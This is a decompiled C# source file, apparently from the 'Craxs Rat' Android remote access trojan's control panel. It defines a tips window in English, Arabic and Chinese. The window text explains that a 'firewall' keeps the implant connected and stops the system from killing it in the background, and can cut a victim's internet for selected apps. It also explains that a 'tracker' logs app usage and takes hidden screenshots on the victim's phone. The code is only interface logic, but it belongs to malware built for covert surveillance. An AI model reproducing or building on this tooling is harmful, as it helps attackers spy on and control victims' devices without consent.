using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class tipfirewalltracker : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon16")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon16;

	[AccessedThroughProperty("button2")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _button2;

	private string FirstTipEN;

	private string FirstTipAR;

	private string FirstTipCN;

	private string ARtipFW;

	private string ARtipTR;

	private string ENtipTR;

	private string ENtipFW;

	private string CNtipTR;

	private string CNtipFW;

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FWtext")]
	internal virtual Label FWtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TRtext")]
	internal virtual Label TRtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon16
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon16_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon16;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon16 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon16;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon button2
	{
		[CompilerGenerated]
		get
		{
			return _button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _button2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_button2 = value;
			drakeUIButtonIcon = _button2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public tipfirewalltracker()
	{
		base.Load += Tipfirewalltracker_Load;
		FirstTipEN = "firewall and tracker is different tools and not related to each other , each one can work by it self";
		FirstTipAR = "يعد جدار الحماية والمتعقب أداتين مختلفتين وغير مرتبطين ببعضهما البعض ، يمكن لكل منهما العمل بنفسه";
		FirstTipCN = "防火墙和跟踪器是不同的工具，彼此之间没有关系，每个工具都可以独立工作";
		ARtipFW = "سيجعل جدار الحماية تطبيق craxs يعمل مثل VPN:\r\n\r\nما الغرض منه؟\r\n- لن يؤثر على سرعة الإنترنت على الإطلاق\r\n\r\n- مساعدة تطبيق craxs للحصول على اتصال طويل الأمد\r\n\r\n- منع النظام من قتل التطبيق في الخلفية\r\n\r\n- السماح لك بقطع الإنترنت عن التطبيقات المختارة\r\n\r\n- ملاحظة: لقطع الإنترنت ، قم بحظر التطبيق أولا\u064b ، ثم ابدأ تشغيل جدار الحماية";
		ARtipTR = "سيقوم المتعقب بمراقبة وتتبع أي تطبيق تريده:\r\n\r\n  - مراقبة وتسجيل وقت الدخول والخروج من التطبيق\r\n\r\n- يأخذ لقطات شاشة (هيكل) ويحفظ لقطة الشاشة على الهاتف (مخفي)";
		ENtipTR = "the tracker will monitor and track any app you want:\r\n\r\n - monitor and record the enter and the exit time from app \r\n\r\n- takes screenshots (Structure) and save the screen shot on the phone (Hidden)";
		ENtipFW = "Firewall will make craxs app works as VPN :\r\n\r\nWhat it's for ?\r\n- it won't effect the internet speed at all\r\n\r\n- help craxs app to have long time connection\r\n\r\n- prevent the system from killing the app in background\r\n\r\n- Allow you to cut-off the internet from selected apps \r\n\r\n- PS: to cut-off the internet , Block app first , then start firewall";
		CNtipTR = "跟踪器将监视和跟踪您想要的任何应用程序：\r\n\r\n  - 监控并记录应用程序的进入和退出时间\r\n\r\n- 截取屏幕截图（结构）并将屏幕截图保存在手机上（隐藏）";
		CNtipFW = "防火墙将使 craxs 应用程序作为 VPN 运行：\r\n\r\n它是做什么用的？\r\n- 它根本不会影响互联网速度\r\n\r\n- 帮助craxs应用程序具有长时间连接\r\n\r\n- 防止系统在后台杀死应用程序\r\n\r\n- 允许您切断选定应用程序的互联网\r\n\r\n- PS：要切断互联网，请先阻止应用程序，然后启动防火墙";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Craxs_Rat.tipfirewalltracker));
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.FWtext = new System.Windows.Forms.Label();
		this.TRtext = new System.Windows.Forms.Label();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon16 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Label4 = new System.Windows.Forms.Label();
		this.Label3 = new System.Windows.Forms.Label();
		this.button2 = new DrakeUI.Framework.DrakeUIButtonIcon();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		this.Panel1.SuspendLayout();
		base.SuspendLayout();
		this.PictureBox1.BackColor = System.Drawing.Color.Black;
		this.PictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.PictureBox1.Image = (System.Drawing.Image)resources.GetObject("PictureBox1.Image");
		this.PictureBox1.Location = new System.Drawing.Point(0, 0);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(1226, 526);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 0;
		this.PictureBox1.TabStop = false;
		this.FWtext.BackColor = System.Drawing.Color.Transparent;
		this.FWtext.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.FWtext.Location = new System.Drawing.Point(12, 140);
		this.FWtext.Name = "FWtext";
		this.FWtext.Size = new System.Drawing.Size(539, 340);
		this.FWtext.TabIndex = 1;
		this.FWtext.Text = resources.GetString("FWtext.Text");
		this.TRtext.BackColor = System.Drawing.Color.Transparent;
		this.TRtext.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.TRtext.Location = new System.Drawing.Point(650, 140);
		this.TRtext.Name = "TRtext";
		this.TRtext.Size = new System.Drawing.Size(539, 340);
		this.TRtext.TabIndex = 2;
		this.TRtext.Text = "the tracker will monitor and track any app you want:\r\n\r\n - monitor and record the enter and the exit time from app \r\n\r\n- takes screenshots (Structure) and save the screen shot on the phone (Hidden)";
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.DrakeUIButtonIcon16);
		this.Panel1.Controls.Add(this.Label4);
		this.Panel1.Controls.Add(this.Label3);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.Font = new System.Drawing.Font("Calibri", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(1226, 483);
		this.Panel1.TabIndex = 3;
		this.DrakeUIButtonIcon16.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon16.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeUIButtonIcon16.FillColor = System.Drawing.Color.Black;
		this.DrakeUIButtonIcon16.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.DrakeUIButtonIcon16.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon16.Location = new System.Drawing.Point(0, 414);
		this.DrakeUIButtonIcon16.Name = "DrakeUIButtonIcon16";
		this.DrakeUIButtonIcon16.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIButtonIcon16.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon16.Size = new System.Drawing.Size(1226, 69);
		this.DrakeUIButtonIcon16.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon16.StyleCustomMode = true;
		this.DrakeUIButtonIcon16.SymbolSize = 30;
		this.DrakeUIButtonIcon16.TabIndex = 32;
		this.DrakeUIButtonIcon16.Text = "OK";
		this.Label4.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Label4.Font = new System.Drawing.Font("Calibri", 18f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label4.ForeColor = System.Drawing.Color.Red;
		this.Label4.Location = new System.Drawing.Point(0, 115);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(1226, 368);
		this.Label4.TabIndex = 1;
		this.Label4.Text = "firewall and tracker is different tools and not related to each other , each one can work by it self";
		this.Label4.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label3.Font = new System.Drawing.Font("Calibri", 18f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label3.ForeColor = System.Drawing.Color.Red;
		this.Label3.Location = new System.Drawing.Point(0, 0);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(1226, 115);
		this.Label3.TabIndex = 0;
		this.Label3.Text = "Important !!!";
		this.Label3.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.button2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.button2.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.button2.Enabled = false;
		this.button2.FillColor = System.Drawing.Color.Black;
		this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.button2.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.button2.Location = new System.Drawing.Point(0, 483);
		this.button2.Name = "button2";
		this.button2.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.button2.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.button2.Size = new System.Drawing.Size(1226, 43);
		this.button2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.button2.StyleCustomMode = true;
		this.button2.SymbolSize = 30;
		this.button2.TabIndex = 33;
		this.button2.Text = "OK";
		this.button2.Visible = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(1226, 526);
		base.ControlBox = false;
		base.Controls.Add(this.Panel1);
		base.Controls.Add(this.button2);
		base.Controls.Add(this.TRtext);
		base.Controls.Add(this.FWtext);
		base.Controls.Add(this.PictureBox1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "tipfirewalltracker";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Tips";
		base.TopMost = true;
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		this.Panel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void DrakeUIButtonIcon16_Click(object sender, EventArgs e)
	{
		button2.Visible = true;
		button2.Enabled = true;
		Panel1.SendToBack();
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void Tipfirewalltracker_Load(object sender, EventArgs e)
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
			{
				TRtext.Text = ENtipTR;
				FWtext.Text = ENtipFW;
				Label4.Text = FirstTipEN;
			}
			else
			{
				TRtext.Text = CNtipTR;
				FWtext.Text = CNtipFW;
				Label4.Text = FirstTipCN;
			}
		}
		else
		{
			TRtext.Text = ARtipTR;
			TRtext.RightToLeft = (RightToLeft)(-1);
			FWtext.Text = ARtipFW;
			FWtext.RightToLeft = (RightToLeft)(-1);
			Label4.Text = FirstTipAR;
			Label4.RightToLeft = (RightToLeft)(-1);
		}
	}
}
